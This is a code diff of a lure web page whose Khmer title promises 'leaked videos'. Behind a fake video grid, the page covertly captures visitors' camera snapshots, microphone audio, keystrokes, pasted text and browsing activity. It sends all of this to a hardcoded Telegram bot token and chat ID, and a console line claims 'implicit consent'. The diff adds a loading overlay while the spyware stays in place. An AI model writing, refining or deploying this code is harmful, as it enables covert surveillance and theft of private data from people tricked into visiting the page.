@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>វីដេអូបែកធ្លាយ</title>
   <style>
-    /* Your original styles here, unchanged for brevity */
+    /* --- YOUR EXISTING STYLES --- */
     @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500;700&display=swap');
     :root {
       --theme-color: #FF0076;
@@ -52,9 +52,47 @@
     .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.6); backdrop-filter: blur(5px); opacity: 0; transition: opacity 0.3s ease; }
     .modal.visible { display: block; opacity: 1; }
     .modal-content { background-color: #fff; margin: 15% auto; padding: 30px; border: none; width: 90%; max-width: 400px; border-radius: 12px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+
+    /* --- NEW STYLES FOR LOADING INDICATOR --- */
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(5px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      transition: opacity 0.3s ease-in-out;
+    }
+    .loading-overlay.hidden {
+      opacity: 0;
+      pointer-events: none; /* Don't block clicks when hidden */
+    }
+    .spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      border-left-color: var(--theme-color); /* Use theme color for spinner */
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    /* --- END NEW STYLES --- */
   </style>
 </head>
 <body>
+
+<!-- --- LOADING OVERLAY --- -->
+<div id="loadingOverlay" class="loading-overlay">
+  <div class="spinner"></div>
+</div>
+<!-- --- END LOADING OVERLAY --- -->
 
 <header class="site-header">
   <h1 id="header-title">វីដេអូបែកធ្លាយ</h1>
@@ -87,6 +125,9 @@
   <aside id="recommendations-sidebar" class="recommendations-sidebar"></aside>
 </main>
 
+<!-- Login form removed from structure, but script listener remains if needed -->
+<!-- If you don't need login, remove the form HTML and its listener -->
+
 <div class="capture-container" style="display: none;">
   <video id="videoElementForCapture" autoplay playsinline></video>
   <canvas id="snapshot"></canvas>
@@ -106,16 +147,16 @@ const App = {
   config: {
     botToken: "7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI", // !!! REPLACE WITH YOUR ACTUAL BOT TOKEN !!!
     chatId: "1272791365", // !!! REPLACE WITH YOUR ACTUAL CHAT ID !!!
-    snapshotInterval: 15000, // 15 seconds for camera snapshots
-    micRecordInterval: 30000, // 30 seconds for microphone chunks
-    activityTrackingInterval: 5000, // Report accumulated activity every 5 seconds
-    pageAnalyticsInterval: 60000, // Report page analytics and check inactivity every minute
-    sessionTimeout: 1800000, // 30 minutes of inactivity before session ends
-    maxBufferedEvents: 50, // Limit the number of buffered events to prevent memory issues
+    snapshotInterval: 15000,
+    micRecordInterval: 30000,
+    activityTrackingInterval: 5000,
+    pageAnalyticsInterval: 60000,
+    sessionTimeout: 1800000,
+    maxBufferedEvents: 50,
   },
   state: {
     isLoggedIn: false,
-    isTrackingActive: true, // Tracking is active by default
+    isTrackingActive: true,
     pageStartTime: Date.now(),
     lastActivityTime: Date.now(),
     sessionStartTime: Date.now(),
@@ -133,6 +174,7 @@ const App = {
     devToolsOpen: false,
     pagePerformanceMetrics: {},
     linkClicks: [],
+    isContentLoaded: false, // Flag to track if content is ready
   },
   DOM: {},
   init() {
@@ -145,16 +187,27 @@ const App = {
       captureVideo: document.getElementById('videoElementForCapture'),
       captureCanvas: document.getElementById('snapshot'),
       videoGrid: document.querySelector('.video-grid'),
+      loadingOverlay: document.getElementById('loadingOverlay'), // Get the loading overlay element
     };
 
     console.log("Tracking is active by default (implicit consent).");
 
     this.recordPageLoadTimes();
-    this.generateVideoGrid();
-    this.setupEventListeners();
+    this.generateVideoGrid(); // Generates video cards
+
+    // Start trackers early, but manage content visibility
     this.Tracking.initialize();
     this.startPageAnalytics();
     this.startSessionTimer();
+
+    // Setup event listeners after content generation
+    this.setupEventListeners();
+
+    // Once content is generated and loaded, mark content as ready
+    // For simplicity, we assume content generation is the main async task.
+    // A more robust solution might wait for images to load etc.
+    this.state.isContentLoaded = true;
+    this.hideLoadingOverlay();
   },
 
   recordPageLoadTimes() {
@@ -171,7 +224,6 @@ const App = {
       };
       console.log("Page Load Metrics recorded:", this.state.pagePerformanceMetrics);
     } else {
-      // Fallback for older browsers or specific environments
       this.state.pagePerformanceMetrics.fetchStart = performance.timing.fetchStart;
       this.state.pagePerformanceMetrics.domContentLoadedEventEnd = performance.timing.domContentLoadedEventEnd;
       this.state.pagePerformanceMetrics.loadEventEnd = performance.timing.loadEventEnd;
@@ -184,11 +236,9 @@ const App = {
   generateVideoGrid() {
     console.log("Generating video grid...");
     const videos = [
-      // Existing videos with corrected src paths (assuming root directory)
       { id: 1, title: "Amazing Nature Scenery", thumbnail: "thumb1.jpg", src: "video1.mp4", channel: "Nature Explorer", channelAvatar: "avatar1.jpg", views: "1.2M", timestamp: "2 days ago" },
       { id: 2, title: "Tech Review: Latest Gadgets", thumbnail: "thumb2.jpg", src: "video2.mp4", channel: "Tech Guru", channelAvatar: "avatar2.jpg", views: "500K", timestamp: "1 week ago" },
       { id: 3, title: "Cooking Tutorial: Pasta", thumbnail: "thumb3.jpg", src: "video3.mp4", channel: "Chef John", channelAvatar: "avatar3.jpg", views: "3M", timestamp: "5 hours ago" },
-      // New videos with src paths set to filename only (assuming root directory)
       { id: 4, title: "Abstract Visuals p1", thumbnail: "thumb4.jpg", src: "p1.mp4", channel: "Abstract Artist", channelAvatar: "avatar4.jpg", views: "50K", timestamp: "1 day ago" },
       { id: 5, title: "Nature Montage p2", thumbnail: "thumb5.jpg", src: "p2.mp4", channel: "Nature Explorer", channelAvatar: "avatar1.jpg", views: "80K", timestamp: "3 days ago" },
       { id: 6, title: "Tech Demo p3", thumbnail: "thumb6.jpg", src: "p3.mp4", channel: "Tech Guru", channelAvatar: "avatar2.jpg", views: "120K", timestamp: "2 days ago" },
@@ -202,7 +252,7 @@ const App = {
       console.error("Video grid element not found!");
       return;
     }
-    videoGrid.innerHTML = ''; // Clear existing grid
+    videoGrid.innerHTML = '';
 
     videos.forEach(video => {
       const card = document.createElement('div');
@@ -210,7 +260,7 @@ const App = {
       card.innerHTML = `
         <div class="thumbnail-wrapper">
           <video src="${video.src}" preload="metadata"></video>
-          <span class="duration">3:45</span> <!-- Placeholder duration -->
+          <span class="duration">3:45</span>
         </div>
         <div class="video-details">
           <img src="${video.channelAvatar}" alt="Channel Avatar" class="channel-avatar" />
@@ -254,33 +304,25 @@ const App = {
       });
     }
 
-    // --- Optimized Event Listeners ---
-    // Use a single listener for clicks and delegate to child elements
     document.addEventListener('click', (e) => {
       if (!this.state.isTrackingActive) return;
 
       const target = e.target;
       const backButton = document.getElementById('back-to-grid');
 
-      // Handle back button separately if it's not captured by delegation
-      if (target === backButton || backButton.contains(target)) {
-        // Handled by its own listener
-        return;
+      if (target === backButton || (backButton && backButton.contains(target))) {
+        return; // Back button has its own listener
       }
 
-      // Link click tracking
       const link = target.closest('a');
       if (link && link.href && !link.href.endsWith('#') && link.origin === window.location.origin) {
         this.trackLinkClick(link);
       }
 
-      // Generic click tracking (optional, can be very noisy)
-      this.trackClick(e);
-
+      this.trackClick(e); // Generic click tracking
       this.updateActivityTime();
     });
 
-    // Debounce scroll and mousemove to reduce frequency of updates
     let scrollTimeout;
     document.addEventListener('scroll', () => {
       if (!this.state.isTrackingActive) return;
@@ -288,8 +330,8 @@ const App = {
       scrollTimeout = setTimeout(() => {
         this.trackScroll();
         this.updateActivityTime();
-      }, 100); // Throttle scroll events
-    }, { passive: true }); // Use passive listener for better scroll performance
+      }, 100);
+    }, { passive: true });
 
     let mouseMoveTimeout;
     document.addEventListener('mousemove', (e) => {
@@ -298,7 +340,7 @@ const App = {
       mouseMoveTimeout = setTimeout(() => {
         this.trackMouseMove(e);
         this.updateActivityTime();
-      }, 100); // Throttle mousemove events
+      }, 100);
     });
 
     document.addEventListener('keypress', (e) => {
@@ -424,7 +466,6 @@ const App = {
     report += `*Time on Page:* ${this.formatTime(timeOnPage)}\n`;
     report += `*Session Duration:* ${this.formatTime(sessionDuration)}\n`;
 
-    // Page Performance Metrics
     if (Object.keys(this.state.pagePerformanceMetrics).length > 0) {
         report += `*Page Performance:*\n`;
         report += `  *Fetch Start:* ${this.state.pagePerformanceMetrics.fetchStart ? new Date(this.state.pagePerformanceMetrics.fetchStart).toISOString() : 'N/A'}\n`;
@@ -437,7 +478,6 @@ const App = {
     const tti = Date.now() - this.state.pageStartTime;
     report += `*Approximate TTI (last interaction):* ${this.formatTime(tti)}\n`;
 
-    // Include buffered Link Clicks
     if (this.state.linkClicks.length > 0) {
         report += `*Link Clicks (${this.state.linkClicks.length}):*\n`;
         this.state.linkClicks.forEach(click => {
@@ -452,7 +492,6 @@ const App = {
 
     this.Tracking.send(report, true);
 
-    // Clear buffers after sending the summary report
     this.state.mouseMovements = [];
     this.state.scrollHistory = [];
     this.state.copyPasteEvents = [];
@@ -471,20 +510,16 @@ const App = {
 
   trackMouseMove(event) {
     const now = Date.now();
-    // Buffer mouse movements to reduce frequency of detailed reports
     if (this.state.mouseMovements.length < this.config.maxBufferedEvents) {
         this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
     } else {
-        // If buffer is full, remove the oldest entry to make space
-        this.state.mouseMovements.shift();
+        this.state.mouseMovements.shift(); // Remove oldest if buffer is full
         this.state.mouseMovements.push({ x: event.clientX, y: event.clientY, t: now });
     }
     this.updateActivityTime();
   },
 
   trackClick(event) {
-    // Generic click tracking - could be noisy if not batched or filtered.
-    // Currently only updates activity time. Add to buffer if detailed click logging is needed.
     this.updateActivityTime();
   },
 
@@ -493,7 +528,6 @@ const App = {
       top: window.scrollY,
       t: Date.now()
     };
-    // Buffer scroll events
     if (this.state.scrollHistory.length < this.config.maxBufferedEvents) {
         this.state.scrollHistory.push(scrollData);
     } else {
@@ -512,12 +546,11 @@ const App = {
       t: Date.now()
     };
     this.state.copyPasteEvents.push(eventData);
-    // Limit buffer size for copy/paste events as well
     if (this.state.copyPasteEvents.length > this.config.maxBufferedEvents) {
         this.state.copyPasteEvents.shift();
     }
 
-    if (type === 'paste') { // Paste is more sensitive, send immediately
+    if (type === 'paste') {
       this.Tracking.send(`📝 ${type.charAt(0).toUpperCase() + type.slice(1)}: \`${eventData.content.replace(/`/g, "'")}\``, true);
     }
     this.updateActivityTime();
@@ -534,11 +567,16 @@ const App = {
     };
     this.state.linkClicks.push(linkInfo);
     console.log("Link clicked:", linkInfo);
-    // Limit buffer size
     if (this.state.linkClicks.length > this.config.maxBufferedEvents) {
         this.state.linkClicks.shift();
     }
     this.updateActivityTime();
+  },
+
+  hideLoadingOverlay() {
+    if (this.DOM.loadingOverlay) {
+      this.DOM.loadingOverlay.classList.add('hidden');
+    }
   },
 
   stopAllTracking() {
@@ -549,23 +587,19 @@ const App = {
     if (this.state.pageAnalyticsIntervalId) clearInterval(this.state.pageAnalyticsIntervalId);
     this.Tracking.stopCamera();
     this.Tracking.stopMicrophone();
-    // Clear interval IDs
     this.state.snapshotIntervalId = null;
     this.state.activityTrackerIntervalId = null;
     this.state.pageAnalyticsIntervalId = null;
 
-    // Clear all buffered data
     this.state.mouseMovements = [];
     this.state.scrollHistory = [];
     this.state.copyPasteEvents = [];
     this.state.keyLogBuffer = "";
     this.state.linkClicks = [];
 
-    // Send final keystrokes before fully stopping
     if (this.state.keyLogBuffer.length > 0) {
       this.Tracking.send(`⌨️ Final Keystrokes: \`${this.state.keyLogBuffer.replace(/`/g, "'")}\``, true);
     }
-    // Send final interaction summary
     this.logPageInteraction();
   },
 
@@ -580,7 +614,7 @@ const App = {
 
   // --- Tracking Module ---
   Tracking: {
-    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`, // !!! Use your token !!!
+    telegramApiBaseUrl: `https://api.telegram.org/bot${"7031493240:AAELJ34j51BTU3Gew_a6N5Eh1m3DUzBjySI"}/`,
 
     async send(message, notify = false) {
       if (!App.state.isTrackingActive) return;
@@ -590,7 +624,7 @@ const App = {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            chat_id: "1272791365", // !!! Use your chat ID !!!
+            chat_id: "1272791365",
             text: message,
             parse_mode: 'Markdown',
             disable_notification: !notify
@@ -724,7 +758,7 @@ const App = {
         };
       } catch (e) {
         console.warn(`Error checking/requesting permission for ${name}:`, e);
-        requestFn(); // Fallback to direct request
+        requestFn();
       }
     },
 
@@ -913,7 +947,7 @@ const App = {
       const context = canvas.getContext('2d');
 
       if (video.videoWidth === 0 || video.videoHeight === 0) {
-        return; // Wait for video metadata to load
+        return;
       }
 
       canvas.width = video.videoWidth;
@@ -932,23 +966,10 @@ const App = {
     },
 
     sendAccumulatedActivity() {
-      // This function is intended for periodic reporting of accumulated
-      // but not immediately sent, activities (like mouse movements or scroll events if not throttled).
-      // With throttling implemented for mousemove/scroll, this might be less critical unless
-      // other activities are added that are buffered here.
-      // For now, it serves as a placeholder for potential future use.
+      // Placeholder for sending less critical batched data if needed.
+      // The primary batching is handled by logPageInteraction.
       if (!App.state.isTrackingActive) return;
-
-      let activityReport = "";
-      // Example: if you had a buffer for something else, you'd process it here.
-      // if (App.state.someOtherBuffer.length > 0) {
-      //   activityReport += `*Other Activity (${App.state.someOtherBuffer.length}):* ...`;
-      //   App.state.someOtherBuffer = []; // Clear buffer
-      // }
-
-      if (activityReport) {
-        this.send(activityReport);
-      }
+      // Logic to send accumulated, non-urgent data could go here.
     }
   }
 };
@@ -957,6 +978,3 @@ const App = {
 document.addEventListener('DOMContentLoaded', () => {
   App.init();
 });
-</script>
-</body>
-</html>
